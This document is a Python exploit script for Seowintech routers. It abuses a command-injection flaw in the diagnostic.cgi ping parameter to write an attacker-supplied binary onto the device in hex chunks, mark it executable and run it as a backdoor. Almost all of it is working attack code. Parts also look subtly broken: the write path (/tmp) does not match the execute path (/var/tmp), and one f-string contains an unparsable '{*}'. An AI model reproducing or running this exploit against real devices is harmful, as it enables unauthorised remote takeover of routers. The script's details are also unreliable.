#!/usr/bin/env python3
# coding: utf-8
# Author: Darren Martyn, Xiphos Research Ltd.
# Version: 20150425.1
# Licence: WTFPL - wtfpl.net
import sys
import requests
from progressbar import ProgressBar

# globals
__version__ = "20150425.1"
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 5.1; 32bit; rv:10.0) Gecko/20100301 Firefox/10.0)'}

def banner():
    print(f"""\
\x1b[1;32m
███████╗███████╗ ██████╗ ██╗    ██╗███╗   ██╗███████╗██████╗ 
██╔════╝██╔════╝██╔═████╗██║    ██║████╗  ██║██╔════╝██╔══██╗
███████╗█████╗  ██║██╔██║██║ █╗ ██║██╔██╗ ██║█████╗  ██║  ██║
╚════██║██╔══╝  ████╔╝██║██║███╗██║██║╚██╗██║██╔══╝  ██║  ██║
███████║███████╗╚██████╔╝╚███╔███╔╝██║ ╚████║███████╗██████╔╝
╚══════╝╚══════╝ ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═════╝ 
Exploit for Seowintech Routers, CVE-?. Version: {__version__}\x1b[0m""")

def usage(progname):
    print(f"usage: {progname} <target ip:port> <binary to upload/execute>")
    print(f"eg: {progname} http://target.com:8080 executable.bin")
    sys.exit(0)

def gen_shellcode(binaryfile):
    with open(binaryfile, "rb") as f:
        tmp = f.read()
    shellcode = ''.join([f"\\x{byte:02x}" for byte in tmp])
    return shellcode

def up_shell(shellcode, target):
    haxurl = f"{target}/cgi-bin/diagnostic.cgi?select_mode_ping=on&ping_ipaddr=-q -s 0 127.0.0.1;INSERTCODE;&ping_count=1&action=Apply&html_view=ping"
    n = 700
    blobs = [shellcode[i:i+n] for i in range(0, len(shellcode), n)]
    num_blobs = len(blobs)
    idx = 1
    print("\x1b[1;31m{+} Uploading our backdoor...\x1b[0m")
    print(f"\x1b[1;31m{*} Backdoor is in {num_blobs} chunks...\x1b[0m")
    pbar = ProgressBar(maxval=num_blobs+1).start()
    for blob in blobs:
        cmd = f"echo -ne '{blob}' {'>' if idx == 1 else '>>'} /tmp/silverlords.bin"
        url = haxurl.replace("INSERTCODE", cmd)
        requests.get(url=url, headers=headers)
        pbar.update(idx+1)
        idx += 1
    pbar.finish()
    pwnurl1 = haxurl.replace("INSERTCODE", "chmod 777 /var/tmp/silverlords.bin")
    print("\x1b[1;31m{+} Setting execute bit...\x1b[0m")
    requests.get(url=pwnurl1, headers=headers)
    pwnurl2 = haxurl.replace("INSERTCODE", "/var/tmp/silverlords.bin")
    print("\x1b[1;31m{+} Executing Payload...\x1b[0m")
    requests.get(url=pwnurl2, headers=headers)

def main(args):
    banner()
    if len(args) != 3:
        usage(args[0])
    up_shell(shellcode=gen_shellcode(binaryfile=args[2]), target=args[1])

if __name__ == "__main__":
    main(sys.argv)